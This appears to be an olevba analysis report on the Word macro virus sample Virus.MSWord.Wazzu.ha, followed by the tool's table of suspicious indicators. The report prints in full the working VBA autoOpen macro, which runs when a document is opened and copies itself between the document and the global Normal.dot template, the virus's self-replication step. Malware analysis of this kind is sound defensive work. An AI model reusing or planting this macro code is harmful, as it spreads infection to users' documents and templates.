olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu.ha
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu.ha - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu.ha - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Public Sub MAIN()
Dim fichierMacro$
Dim globalMacro$
Dim MacroFichier$
    On Error GoTo -1: On Error GoTo erreuR
        
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg
    


    fichierMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
    globalMacro$ = "Global:autoOpen"
    MacroFichier$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFichier$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy globalMacro$, fichierMacro$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fichierMacro$, globalMacro$
    End If


GoTo fin
erreuR:

fin:
    On Error GoTo -1: On Error GoTo 0

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

